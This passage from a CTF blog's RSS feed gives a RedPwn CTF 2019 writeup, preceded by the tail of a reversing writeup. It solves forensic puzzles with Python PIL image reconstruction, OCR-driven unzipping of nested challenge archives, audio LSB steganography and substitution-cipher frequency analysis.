</p><p>Thanks to @arpox for sharing it.<br>You can just select all of the data in Zproc_libc_fini and  right click-&gt; data -&gt; double.<br>Well I learnt many things through this challenge.  </p><p><a href="/img/cryptix/8.png" class="gallery-item"><img src="/img/cryptix/8.png"></a>   </p><p>Also the challenge source was disclosed by the admin.  </p><blockquote><p>Download <a href="/files/cryptix/Crack_It.c"  target="_blank">challenge_source.c</a></p></blockquote><p>I’ll be posting about some of my favourite crackmes soon.  </p><p>So Make sure to subscribe to the newsletter to learn together with me.<br>Also Comment your feedbacks and share this writeup with your friends.  </p><p>And Keep Escalating the Priveleges Gang!!  </p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content:encoded>
      
      
      <category domain="https://mrt4ntr4.github.io/categories/CTF-Writeups/">CTF Writeups</category>
      
      
      <category domain="https://mrt4ntr4.github.io/tags/writeup/">writeup</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/ctf/">ctf</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/cryptix/">cryptix</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/crackit/">crackit</category>
      
      <category domain="https://mrt4ntr4.github.io/tags/reversing/">reversing</category>
      
      
      <comments>https://mrt4ntr4.github.io/Cryptix-CTF-Crackit/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>RedPwn CTF 2019</title>
      <link>https://mrt4ntr4.github.io/RedPwn-CTF-Writeups/</link>
      <guid>https://mrt4ntr4.github.io/RedPwn-CTF-Writeups/</guid>
      <pubDate>Sat, 17 Aug 2019 07:00:00 GMT</pubDate>
      
        
        
      <description>&lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css&quot; /&gt;&lt;div class=&quot;.article</description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p><a href="/img/redpwn/banner.png" title="banner" class="gallery-item"><img src="/img/redpwn/banner.png" alt="banner"></a></p><p>Well to get started, I want to give you a glimpse of my experience with the CTF.<br>The Redpwn Organizers really did an awesome job in creating the challenges.<br>The quality of the challenges was awesome. Difficulty level was also mediumish.<br>It was a 3 day CTF and new challenges were updated timely.<br>The site got really slow once but that’s pretty common nowadays with the CTFd platform. XD</p><p>So after the 3 days long journey my team got the 8th position.</p><p><a href="/img/redpwn/teamscore.png" class="gallery-item"><img src="/img/redpwn/teamscore.png"></a></p><p>And in today’s post we’ll be discussing some forensic challenges only. I found these challenges worth a writeup and also I enjoyed them solving.</p><h5 id="Some-Quick-Links"><a href="#Some-Quick-Links" class="headerlink" title="Some Quick Links"></a>Some Quick Links</h5><p><a href="#redpwngetsbamboozled">RedpwnGetsBamboozled</a><br><a href="#dedication">Dedication</a><br><a href="#skywriting">Skywriting</a>   </p><hr><h2 id="RedpwnGetsBamboozled"><a href="#RedpwnGetsBamboozled" class="headerlink" title="RedpwnGetsBamboozled"></a>RedpwnGetsBamboozled</h2><h5 id="Task-Description"><a href="#Task-Description" class="headerlink" title="Task Description :"></a>Task Description :</h5><p><a href="/img/redpwn/rgb.png" class="gallery-item"><img src="/img/redpwn/rgb.png"></a></p><p><a href="/files/redpwn/data.txt"  target="_blank">Download File</a></p><p>We were given just a txt file.  </p><p><a href="/img/redpwn/rgb1.png" class="gallery-item"><img src="/img/redpwn/rgb1.png"></a></p><p>Ahhh! We can quickly observe that these are some (R, G, B) Values.<br>Also the initials of the Challenge Title is R, G, B XD<br>And at the beginning we get width and height as 600,800 respectively.  </p><p>So its a basic python PIL task.<br>I just deleted the width and height values from the data.txt file and iterated all the RGB values and wrote them to a new Image.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">600</span>,<span class="number">800</span>))</span><br><span class="line"></span><br><span class="line">infile = <span class="built_in">open</span>(<span class="string">&#x27;data.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = infile.read().strip(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;, &#x27;</span>)</span><br><span class="line"></span><br><span class="line">rgblist = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">  v = x.strip(<span class="string">&#x27;)&#x27;</span>).strip(<span class="string">&#x27;(&#x27;</span>).split()</span><br><span class="line">  rgb = (<span class="built_in">int</span>(v[<span class="number">0</span>]),<span class="built_in">int</span>(v[<span class="number">1</span>]),<span class="built_in">int</span>(v[<span class="number">2</span>]))</span><br><span class="line">  rgblist.append(rgb)</span><br><span class="line"></span><br><span class="line">im.putdata(rgblist)</span><br><span class="line">im.save(<span class="string">&quot;output.png&quot;</span>) </span><br></pre></td></tr></table></figure><p>Hmmm, I thought it would give us the flag but instead it gave us the following image.  </p><a href="/img/redpwn/rgb2.png" title="drawing" class="gallery-item"><img src="/img/redpwn/rgb2.png" alt="drawing" width="300"/></a><p>So I tried various ways to decode it…</p><h6 id="Approach-with-the-image"><a href="#Approach-with-the-image" class="headerlink" title="Approach with the image:"></a>Approach with the image:</h6><p>Once I tried stegsolve too LOL</p><a href="/img/redpwn/rgb3.bmp" title="drawing" class="gallery-item"><img src="/img/redpwn/rgb3.bmp" alt="drawing" width="300"/></a><p>After observing Red planes, I got some various patterns of dots that looked like braille but there were 8 dots in a column but we needed a multiple of 3 for decrypting if it would have been braille.  </p><p>Also as one could easily observe that the dots are of different colours so I decided to change my strategy and moved towards the colour codes of the dots</p><p>I simply used the colour picker tool from <strong>GIMP</strong> and noted the color codes..<br>There were 10 different color codes in the image.  </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">222222 cccccc dddddd 999999 444444 ffffff 555555 666666 333333 666666</span><br></pre></td></tr></table></figure><p>I also tried sorting them by observing how frequently they appeared.<br>I tried taking their initials as all have single character.<br>And It came to me that what if the order is provided within the image itself as it can’t be so random dots.  </p><p>So made a list of the Colour Code Initials ordering them as per the image..  </p><a href="/img/redpwn/rgb4.png" title="drawing" class="gallery-item"><img src="/img/redpwn/rgb4.png" alt="drawing" width="300"/></a><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6d 79 5f 62 33 35 74 5f 66 6c 34 67 5f 79 33 74</span><br></pre></td></tr></table></figure><p>And decoding it from hex to ascii we get the flag.  </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;my_b35t_fl4g_y3t&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="Dedication"><a href="#Dedication" class="headerlink" title="Dedication"></a>Dedication</h2><h5 id="Task-Description-1"><a href="#Task-Description-1" class="headerlink" title="Task Description :"></a>Task Description :</h5><p><a href="/img/redpwn/dedication.png" class="gallery-item"><img src="/img/redpwn/dedication.png"></a></p><p><a href="/files/redpwn/chall.zip"  target="_blank">Download File</a></p><p><a href="/img/redpwn/d1.png" class="gallery-item"><img src="/img/redpwn/d1.png"></a><br>Ok so we got an encrypted zip file and another is a png.    </p><p><a href="/img/redpwn/d2.png" class="gallery-item"><img src="/img/redpwn/d2.png"></a><br>But Wait, it’s not a png file but instead its a text file.    </p><p><a href="/img/redpwn/d3.png" class="gallery-item"><img src="/img/redpwn/d3.png"></a>  </p><p>It also contains some RGB values but instead this time we are not provided with the width and height of the image but here we have different lines which can help us identify the height of the image and the no. of RGB values in a line help us identify the width of image.  </p><p>So we start using our PIL ninja techniques.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">im = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">400</span>,<span class="number">600</span>))</span><br><span class="line">infile = <span class="built_in">open</span>(<span class="string">&#x27;jjofpbwvgk.png&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = infile.read().strip(<span class="string">&#x27;\n&#x27;</span>).split()</span><br><span class="line">rgblist = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">  v = x.strip(<span class="string">&#x27;)&#x27;</span>).strip(<span class="string">&#x27;(&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">  rgb = (<span class="built_in">int</span>(v[<span class="number">0</span>]),<span class="built_in">int</span>(v[<span class="number">1</span>]),<span class="built_in">int</span>(v[<span class="number">2</span>]))</span><br><span class="line">  rgblist.append(rgb)</span><br><span class="line">im.putdata(rgblist)</span><br><span class="line">rotated = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">600</span>,<span class="number">400</span>))</span><br><span class="line">rotated = im.transpose(Image.FLIP_TOP_BOTTOM).rotate(-<span class="number">90</span>,expand=<span class="number">1</span>)</span><br><span class="line">rotated.save(<span class="string">&#x27;output.jpg&#x27;</span>)</span><br></pre></td></tr></table></figure><p>This basic script just writes our pixel RGB values into an image of width and height of 400, 600 respectively. But you could notice that I’ve mirrored the image and then rotated it anticlockwise 90 degrees which was important to understand the text.<br>And I got the following image.  </p><p><a href="/img/redpwn/d4.jpg" class="gallery-item"><img src="/img/redpwn/d4.jpg"></a></p><p>I quickly tried this as the password for the zip file and no wonder it worked. But to my surprise there was another zip with similar contents.<br>Ahhh, So this was also a scripting task. Obviously the basic approach which would help us automate the decryption of images was to use an OCR tool.<br>But this challenge screwed me for a while as I had a habit of using tesseract for every ocr task but this one was a nightmare with tesseract. It gave awful results.  So I tried to switch over to some good ocr tool and I researched for a while and found a command-line tool known as <a href="http://jocr.sourceforge.net/download.html"  target="_blank">GOCR</a><br> which gave somewhat accurate results.    </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install gocr</span><br></pre></td></tr></table></figure><p>I wrote a bit messy script but still it works. XD<br>At first I tried to use ZipFile python library to extract the contents but it was ridiculously slow so I used the simple unzip command.    </p><p>Also note that the password is not correct in every case as GOCR is not trained on this type of font or the colour values might matter so it’s not everytime perfect. So we’ve to enter some passwords manually.<br>To solve this situation and make it easy to enter password interactively while the script is running, we can just check the os.system() return code.<br>I learned that os.system() returns 0 if there is no error while executing the command. You can read more about it <a href="https://stackoverflow.com/questions/6466711/what-is-the-return-value-of-os-system-in-python"  target="_blank">here</a>. I also used <em>Image.show()</em> when the password is incorrect, which helps us in saving some time.  </p><p>So I implemented all this and gave a seed value as the first directory named as <strong>jjofpbwvgk</strong> and put the text (fake png) and the image we got in it.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> zipfile <span class="keyword">import</span> ZipFile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="comment">#random_name = &#x27;jjofpbwvgk&#x27;  #seed_value</span></span><br><span class="line">random_name = <span class="string">&#x27;jjofpbwvgk&#x27;</span></span><br><span class="line">zip_num=<span class="number">1</span></span><br><span class="line">wrongpass=<span class="number">0</span></span><br><span class="line"><span class="comment">#adding some colors for fun</span></span><br><span class="line">green = <span class="string">&#x27;\033[1;32;40m&#x27;</span></span><br><span class="line">red = <span class="string">&#x27;\033[1;31;40m&#x27;</span></span><br><span class="line">cyan = <span class="string">&#x27;\033[1;36;40m&#x27;</span></span><br><span class="line">reset = <span class="string">&#x27;\033[0;37;40m&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    im = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">400</span>,<span class="number">600</span>))</span><br><span class="line">    path = os.getcwd()+<span class="string">&#x27;/&#x27;</span>+random_name</span><br><span class="line">    os.chdir(path)</span><br><span class="line">    infile = <span class="built_in">open</span>(random_name+<span class="string">&#x27;.png&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    data = infile.read().strip(<span class="string">&#x27;\n&#x27;</span>).split()</span><br><span class="line">    rgblist = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data:</span><br><span class="line">      v = x.strip(<span class="string">&#x27;)&#x27;</span>).strip(<span class="string">&#x27;(&#x27;</span>).split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">      rgb = (<span class="built_in">int</span>(v[<span class="number">0</span>]),<span class="built_in">int</span>(v[<span class="number">1</span>]),<span class="built_in">int</span>(v[<span class="number">2</span>]))</span><br><span class="line">      rgblist.append(rgb)</span><br><span class="line">    im.putdata(rgblist)</span><br><span class="line">    rotated = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">400</span>,<span class="number">600</span>))</span><br><span class="line">    rotated = im.transpose(Image.FLIP_TOP_BOTTOM).rotate(-<span class="number">90</span>,expand=<span class="number">1</span>)</span><br><span class="line">    rotated.save(<span class="string">&#x27;pass.jpg&#x27;</span>)</span><br><span class="line">    gocr_cmd = <span class="string">&quot;gocr pass.jpg&quot;</span></span><br><span class="line">    ps = subprocess.Popen(gocr_cmd,shell=<span class="literal">True</span>,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)</span><br><span class="line">    output = ps.communicate()[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#some tweaking to get more correct passwords with gocr</span></span><br><span class="line">    password = output.lower().replace(<span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;g&#x27;</span>).replace(<span class="string">&#x27;\xc3\xac&#x27;</span>,<span class="string">&#x27;i&#x27;</span>).replace(<span class="string">&#x27;\xc3\xad&#x27;</span>,<span class="string">&#x27;i&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> password[<span class="number">0</span>]==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">      password=password.replace(password[<span class="number">0</span>],<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">      password+=<span class="string">&#x27;y&#x27;</span></span><br><span class="line">    <span class="built_in">print</span> cyan, <span class="string">&quot;Extracting Zip :&quot;</span>, zip_num,reset</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;password for&quot;</span>, random_name, <span class="string">&quot;:&quot;</span>, password</span><br><span class="line">    parentdir = os.path.dirname(path)</span><br><span class="line">    os.chdir(parentdir)</span><br><span class="line">    zip_path = path + <span class="string">&#x27;/&#x27;</span> +random_name + <span class="string">&#x27;.zip&#x27;</span></span><br><span class="line">    unzip_cmd1 = <span class="string">&#x27;unzip &#x27;</span> + <span class="string">&#x27;-P &#x27;</span> + password + <span class="string">&#x27; &#x27;</span> + zip_path</span><br><span class="line">    <span class="keyword">if</span>(os.system(unzip_cmd1)==<span class="number">0</span>):</span><br><span class="line">      <span class="built_in">print</span> random_name+<span class="string">&#x27;.zip&#x27;</span> + <span class="string">&quot; extracted successfully&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      wrongpass+=<span class="number">1</span></span><br><span class="line">      unzip_cmd2=<span class="string">&#x27;unzip &#x27;</span> + zip_path</span><br><span class="line">      rotated.show()</span><br><span class="line">      os.system(unzip_cmd2)</span><br><span class="line">    <span class="keyword">with</span> ZipFile(zip_path) <span class="keyword">as</span> zf:</span><br><span class="line">      random_name = zf.namelist()[<span class="number">0</span>][:-<span class="number">1</span>]</span><br><span class="line">    zip_num+=<span class="number">1</span></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span> red,<span class="string">&quot;Wrong password attempts :&quot;</span>,wrongpass,reset</span><br><span class="line">    parentdir = os.path.dirname(path)</span><br><span class="line">    os.chdir(parentdir+ <span class="string">&#x27;/&#x27;</span> + <span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">    gocr_cmd = <span class="string">&quot;gocr flag.png&quot;</span></span><br><span class="line">    ps = subprocess.Popen(gocr_cmd,shell=<span class="literal">True</span>,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)</span><br><span class="line">    <span class="comment">#modifying the output to get our perfect flag</span></span><br><span class="line">    flag = ps.communicate()[<span class="number">0</span>].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> green,<span class="string">&quot;FLAG :&quot;</span>, flag,reset</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>Ok if the script ran successfully you should get 1000 directories and our flag image residing in the 1000th directory.</p><p><a href="/img/redpwn/d5.png" class="gallery-item"><img src="/img/redpwn/d5.png"></a></p><p>At the end, I’d say that it seriously needed some dedication LOL<br>Also If anyone knows about a more precise OCR tool, please let me know in the comments!!  </p><hr><h2 id="Skywriting"><a href="#Skywriting" class="headerlink" title="Skywriting"></a>Skywriting</h2><h5 id="Task-Description-2"><a href="#Task-Description-2" class="headerlink" title="Task Description :"></a>Task Description :</h5><p><a href="/img/redpwn/skywriting.png" class="gallery-item"><img src="/img/redpwn/skywriting.png"></a></p><p><a href="https://drive.google.com/file/d/1wso-K4b_wOXzxfeppPy41Jhc_3WWRTwk/view" target="_blank">Download File</a></p><p>By experience I knew that skywriting is a pretty common name for challenges so I first googled if there was any similar challenge from any previous ctf competition. And the first result I encountered was of PACTF 2018. The challenge was totally duplicated but we had to do it ourselves as flag was not the same as of PACTF. XD  </p><p><a href="/img/redpwn/s1.png" class="gallery-item"><img src="/img/redpwn/s1.png"></a></p><p>You can read that writeup <a href="https://medium.com/@TCS_20XX/pactf-2018-writeup-skywriting-a5f857463c07" target="_blank">here</a>.  </p><p>I was being lazy so I searched more for a while to grab a better writeup which tells how to break the substitution cipher too.<br>I’ll just give a short summary of how I solved it taking the PACTF writeup as a reference as it’s not complete.  </p><p>The key differences that the RedPwn CTF did made was renaming the gusty-garden-galaxy.wav files and modifying the flag so that we understand what we were doing.<br>After reading the writeup I installed the <a href="ttps://github.com/ragibson/Steganography" target="_blank">stegolsb</a> tool.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install stego-lsb</span><br></pre></td></tr></table></figure><p>So I used this tool to get about 5000 bytes of text from the gusty-garden-8.wav file which were enough for getting the flag.  </p><p>I finally got some text from gusty-garden-galaxy-8.wav instead of gusty-garden-galaxy-6.wav.  </p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">stegolsb wavsteg -r -i gusty-garden-galaxy-8.wav -o output.txt -b 5000</span><br></pre></td></tr></table></figure><p>Now If your text editor or terminal supports unicode chars, it’ll display some text similar to the following.  </p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">OMG WOW NO WAY</span><br><span class="line">IT&#x27;S UTF8 GARBAGE AMONGST THE REGULAR GARBAGE!</span><br><span class="line">IT MUST BE A SUBSTITUTION CIPHER!!!!!</span><br><span class="line">خβ θي ظβ⅗يηخ, ⅓ 吉ιη ηλχ伊χ⅓ηيش ιخ خظي ش⅓μμ⅓γλ艾خ艾 خيιرη ي½伊يχ⅓ي⅗γيش ⅓⅗ ηβ艾ع⅓⅗⅘ خظ⅓η 伊χβθ艾ير.  </span><br><span class="line">ظβ吉يعيχ, ⅓ ظβ伊ي ι⅗艾 خيιرη خظιخ 吉يχي ηخ艾ر⅓يش θ艾 ⅓خ شβ⅗’خ خظ⅓⅗开 ⅓خ 吉ιη ⅗يγيηηιχ⅓艾艾   </span><br><span class="line">λ⅗μι⅓χ, πληخ ش⅓μμ⅓γλ艾خ. ⅓ خظ⅓⅗开 يιγظ ηخي伊 ⅓⅗ خظ⅓η ηβ艾λخ⅓β⅗ γβλ艾ش θي γιخι艾艾艾يش θ艾 艾β⅘⅓γι艾 γ艾λيη,  </span><br><span class="line">ι⅗ش ⅗βخظ⅓⅗⅘ χي⅔λ⅓χيش 伊λχي خχ⅓ι艾-ι⅗ش-يχχβχ. ⅓ خظ⅓⅗开 خظي ش⅓μμ⅓γλ艾خ艾 شي艾خι μχβر خظي χيηخ βμ 伊ιγخμ ر⅓⅘ظخ   </span><br><span class="line">ظιعي ي½ιγيχθιخيش خظي ش⅓μμ⅓γλ艾خ⅓يη خيιرη μιγيش: 伊يχظι伊η 伊يβ伊艾ي 吉يχي ي½伊يγخ⅓⅗⅘ ι 伊χβθ艾ير  </span><br><span class="line">γ艾βηيχ خβ خظي χβλ⅗ش 1 ظιχش 伊χβθ艾يرη. ιشش⅓خ⅓β⅗ι艾艾艾, ⅓خ’η ι μι⅓χ艾艾 ⅗β⅗-ηخι⅗شιχش γخμ 伊χβθ艾ير.  </span><br><span class="line">⅓’ش ιχ⅘λي خظιخ 吉βχ开η خβ خظي 伊χβθ艾ير’η ιشعι⅗خι⅘ي, ι⅗ش μχβر 吉ظιخ ⅓’عي ηيي⅗ 伊يβ伊艾ي 吉ظβ ظιعي⅗’خ شβ⅗ي خββ رι⅗艾 γخμη ηييريش  </span><br><span class="line">خβ 艾⅓开ي ⅓خ رβχي, θλخ خظιخ’η ι⅗يγشβخι艾. ⅓μ 艾βλ ش⅓ηι⅘χيي, βχ 吉ι⅗خ خβ ηظιχي ι⅗艾خظ⅓⅗⅘ ي艾ηي, μيي艾 μχيي خβ γβ⅗خιγخ ري! ظβ伊ي  </span><br><span class="line"> 艾βλ ي⅗πβ艾يش خظي γخμ ιη ι 吉ظβ艾ي! ι艾ηβ, ⅓μ 艾βλ 艾⅓开ي 伊χβθ艾يرη 艾⅓开ي خظ⅓η, رι开ي ηλχي خβ γظيγ开 βλخ 伊ιγخμ 2019 ⅓⅗ رι⅗艾 رβ⅗خظη’ خ⅓ري.</span><br><span class="line">    -- ⅗⅓γظβ艾ιηر</span><br><span class="line">开يي伊 ⅘β⅓⅗⅘.</span><br><span class="line">شβ⅗&#x27;خ θي يع⅓艾.</span><br><span class="line">خظ⅓η γظι艾艾ي⅗⅘ي ⅓η ⅓⅗خλ⅓خ⅓عي.</span><br><span class="line">ظيχي ⅓η ι خ⅓⅗艾 ηظβχخي⅗يش γ艾λي خβ خظي شβγλري⅗خ 艾βλ 吉⅓艾艾 ⅗ييش. 开يي伊 艾βλχ ظيιش ⅓⅗ خظي γ艾βλش.</span><br><span class="line">خ⅓⅗艾μ艾ι⅘艾⅓⅗开</span><br><span class="line">--------------------------------</span><br></pre></td></tr></table></figure><p>This wasn’t gibberish, it was just some unicode characters.  </p><p>As this was a substitution cipher, a little bit of <a href="https://en.wikipedia.org/wiki/Frequency_analysis" target="_blank">frequency ananlysis</a> is also required.  So I turned to wikipedia to get some frequency analysis graphs of english alphabets.  </p><p><a href="/img/redpwn/englf.png" class="gallery-item"><img src="/img/redpwn/englf.png"></a></p><p>So I made a simple counter to get the no. of occurences of the unicode chars in the cipher.  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter </span><br><span class="line"></span><br><span class="line">infile = <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">data = infile.read()</span><br><span class="line">cipher = data.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#using collections.Counter() to get  </span></span><br><span class="line"><span class="comment">#count of each element in string  </span></span><br><span class="line">count = Counter(cipher) </span><br><span class="line"><span class="built_in">print</span> <span class="built_in">str</span>(count)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Counter(&#123;<span class="string">u&#x27; &#x27;</span>: <span class="number">548</span>, <span class="string">u&#x27;\u064a&#x27;</span>: <span class="number">361</span>, <span class="string">u&#x27;\u062e&#x27;</span>: <span class="number">295</span>, <span class="string">u&#x27;\u2153&#x27;</span>: <span class="number">234</span>, <span class="string">u&#x27;\u03b9&#x27;</span>: <span class="number">188</span>, <span class="string">u&#x27;\u03b7&#x27;</span>: <span class="number">186</span>, <span class="string">u&#x27;\u03c7&#x27;</span>: <span class="number">171</span>, <span class="string">u&#x27;\u03b2&#x27;</span>: <span class="number">166</span>, <span class="string">u&#x27;\u2157&#x27;</span>: <span class="number">163</span>, <span class="string">u&#x27;\u827e&#x27;</span>: <span class="number">156</span>, <span class="string">u&#x27;\u0638&#x27;</span>: <span class="number">128</span>, <span class="string">u&#x27;\u4f0a&#x27;</span>: <span class="number">92</span>, <span class="string">u&#x27;\u0634&#x27;</span>: <span class="number">90</span>, <span class="string">u&#x27;\u03bb&#x27;</span>: <span class="number">88</span>, <span class="string">u&#x27;\u03b3&#x27;</span>: <span class="number">86</span>, <span class="string">u&#x27;\u0631&#x27;</span>: <span class="number">66</span>, <span class="string">u&#x27;\u03bc&#x27;</span>: <span class="number">60</span>, <span class="string">u&#x27;\u03b8&#x27;</span>: <span class="number">57</span>, <span class="string">u&#x27;\u2158&#x27;</span>: <span class="number">44</span>, <span class="string">u&#x27;-&#x27;</span>: <span class="number">38</span>, <span class="string">u&#x27;,&#x27;</span>: <span class="number">35</span>, <span class="string">u&#x27;\n&#x27;</span>: <span class="number">28</span>, <span class="string">u&#x27;.&#x27;</span>: <span class="number">28</span>, <span class="string">u&#x27;\u5409&#x27;</span>: <span class="number">24</span>, <span class="string">u&#x27;\u0639&#x27;</span>: <span class="number">23</span>, <span class="string">u&#x27;\xbd&#x27;</span>: <span class="number">22</span>, <span class="string">u&#x27;\u5f00&#x27;</span>: <span class="number">18</span>, <span class="string">u&#x27;T&#x27;</span>: <span class="number">9</span>, <span class="string">u&#x27;\u2019&#x27;</span>: <span class="number">8</span>, <span class="string">u&#x27;!&#x27;</span>: <span class="number">8</span>, <span class="string">u&#x27;A&#x27;</span>: <span class="number">8</span>, <span class="string">u&#x27;G&#x27;</span>: <span class="number">7</span>, <span class="string">u&#x27;&quot;&#x27;</span>: <span class="number">6</span>, <span class="string">u&#x27;E&#x27;</span>: <span class="number">6</span>, <span class="string">u&#x27;I&#x27;</span>: <span class="number">5</span>, <span class="string">u&#x27;O&#x27;</span>: <span class="number">5</span>, <span class="string">u&#x27;S&#x27;</span>: <span class="number">5</span>, <span 